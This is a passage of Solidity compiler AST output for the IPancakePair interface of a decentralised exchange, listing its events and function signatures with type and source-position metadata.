										"src": "764:9:5"
									},
									"scope": 1984,
									"src": "711:63:5",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								}
							],
							"scope": 1985,
							"src": "62:714:5"
						}
					],
					"src": "36:741:5"
				},
				"id": 5
			},
			"src/exchange-protocol/contracts/interfaces/IPancakePair.sol": {
				"ast": {
					"absolutePath": "src/exchange-protocol/contracts/interfaces/IPancakePair.sol",
					"exportedSymbols": {
						"IPancakePair": [
							2235
						]
					},
					"id": 2236,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1986,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "36:24:6"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 2235,
							"linearizedBaseContracts": [
								2235
							],
							"name": "IPancakePair",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"documentation": null,
									"id": 1994,
									"name": "Approval",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1993,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1988,
												"indexed": true,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 1994,
												"src": "115:21:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1987,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "115:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1990,
												"indexed": true,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 1994,
												"src": "146:23:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1989,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "146:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1992,
												"indexed": false,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 1994,
												"src": "179:13:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1991,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "179:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "105:93:6"
									},
									"src": "91:108:6"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 2002,
									"name": "Transfer",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 2001,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1996,
												"indexed": true,
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 2002,
												"src": "219:20:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1995,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "219:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1998,
												"indexed": true,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 2002,
												"src": "241:18:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1997,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "241:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2000,
												"indexed": false,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 2002,
												"src": "261:13:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1999,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "261:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "218:57:6"
									},
									"src": "204:72:6"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2007,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "name",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2003,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "295:2:6"
									},
									"returnParameters": {
										"id": 2006,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2005,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 2007,
												"src": "321:13:6",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 2004,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "321:6:6",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "320:15:6"
									},
									"scope": 2235,
									"src": "282:54:6",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2012,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "symbol",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2008,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "357:2:6"
									},
									"returnParameters": {
										"id": 2011,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2010,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 2012,
												"src": "383:13:6",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 2009,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "383:6:6",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "382:15:6"
									},
									"scope": 2235,
									"src": "342:56:6",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2017,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "decimals",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2013,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "421:2:6"
									},
									"returnParameters": {
										"id": 2016,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2015,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 2017,
												"src": "447:5:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 2014,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "447:5:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "446:7:6"
									},
									"scope": 2235,
									"src": "404:50:6",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2022,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "totalSupply",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2018,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "480:2:6"
									},
									"returnParameters": {
										"id": 2021,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2020,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 2022,
												"src": "506:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2019,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "506:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "505:9:6"
									},
									"scope": 2235,
									"src": "460:55:6",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2029,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "balanceOf",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2025,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2024,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 2029,
												"src": "540:13:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2023,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "540:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "539:15:6"
									},
									"returnParameters": {
										"id": 2028,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2027,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 2029,
												"src": "578:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2026,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "578:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "577:9:6"
									},
									"scope": 2235,
									"src": "521:66:6",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2038,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "allowance",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2034,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2031,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 2038,
												"src": "621:13:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2030,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "621:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2033,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 2038,
												"src": "644:15:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2032,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "644:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "611:54:6"
									},
									"returnParameters": {
										"id": 2037,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2036,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 2038,
												"src": "689:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2035,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "689:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "688:9:6"
									},
									"scope": 2235,
									"src": "593:105:6",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2047,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "approve",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2043,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2040,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 2047,
												"src": "721:15:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2039,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "721:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2042,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 2047,
												"src": "738:13:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2041,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "738:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "720:32:6"
									},
									"returnParameters": {
										"id": 2046,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2045,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 2047,
												"src": "771:4:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 2044,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "771:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "770:6:6"
									},
									"scope": 2235,
									"src": "704:73:6",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2056,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transfer",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2052,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2049,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 2056,
												"src": "801:10:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2048,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "801:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2051,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 2056,
												"src": "813:13:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2050,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "813:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "800:27:6"
									},
									"returnParameters": {
										"id": 2055,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2054,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 2056,
												"src": "846:4:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 2053,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "846:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "845:6:6"
									},
									"scope": 2235,
									"src": "783:69:6",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2067,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transferFrom",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2063,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2058,
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 2067,
												"src": "889:12:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2057,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "889:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2060,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 2067,
												"src": "911:10:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2059,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "911:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2062,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 2067,
												"src": "931:13:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2061,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "931:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "879:71:6"
									},
									"returnParameters": {
										"id": 2066,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2065,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 2067,
												"src": "969:4:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 2064,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "969:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "968:6:6"
									},
									"scope": 2235,
									"src": "858:117:6",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2072,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "DOMAIN_SEPARATOR",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2068,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1006:2:6"
									},
									"returnParameters": {
										"id": 2071,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2070,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 2072,
												"src": "1032:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 2069,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "1032:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1031:9:6"
									},
									"scope": 2235,
									"src": "981:60:6",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2077,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "PERMIT_TYPEHASH",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2073,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1071:2:6"
									},
									"returnParameters": {
										"id": 2076,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2075,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 2077,
												"src": "1097:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 2074,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "1097:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1096:9:6"
									},
									"scope": 2235,
									"src": "1047:59:6",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2084,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "nonces",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2080,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2079,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 2084,
												"src": "1128:13:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2078,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1128:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1127:15:6"
									},
									"returnParameters": {
										"id": 2083,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2082,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 2084,
												"src": "1166:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2081,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1166:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1165:9:6"
									},
									"scope": 2235,
									"src": "1112:63:6",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 2101,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "permit",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2099,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2086,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 2101,
												"src": "1206:13:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2085,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1206:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2088,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 2101,
												"src": "1229:15:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2087,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1229:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2090,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 2101,
												"src": "1254:13:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2089,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1254:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2092,
												"name": "deadline",
												"nodeType": "VariableDeclaration",
												"scope": 2101,
												"src": "1277:16:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2091,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1277:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2094,
												"name": "v",
												"nodeType": "VariableDeclaration",
												"scope": 2101,
												"src": "1303:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 2093,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "1303:5:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2096,
												"name": "r",
												"nodeType": "VariableDeclaration",
												"scope": 2101,
												"src": "1320:9:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 2095,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "1320:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2098,
												"name": "s",
												"nodeType": "VariableDeclaration",
												"scope": 2101,
												"src": "1339:9:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 2097,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "1339:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1196:158:6"
									},
									"returnParameters": {
										"id": 2100,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1363:0:6"
									},
									"scope": 2235,
									"src": "1181:183:6",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 2109,
									"name": "Mint",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 2108,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2103,
												"indexed": true,
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"scope": 2109,
												"src": "1381:22:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2102,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1381:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2105,
												"indexed": false,
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"scope": 2109,
												"src": "1405:15:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2104,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1405:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2107,
												"indexed": false,
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"scope": 2109,
												"src": "1422:15:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2106,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1422:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1380:58:6"
									},
									"src": "1370:69:6"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 2119,
									"name": "Burn",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 2118,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2111,
												"indexed": true,
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"scope": 2119,
												"src": "1464:22:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
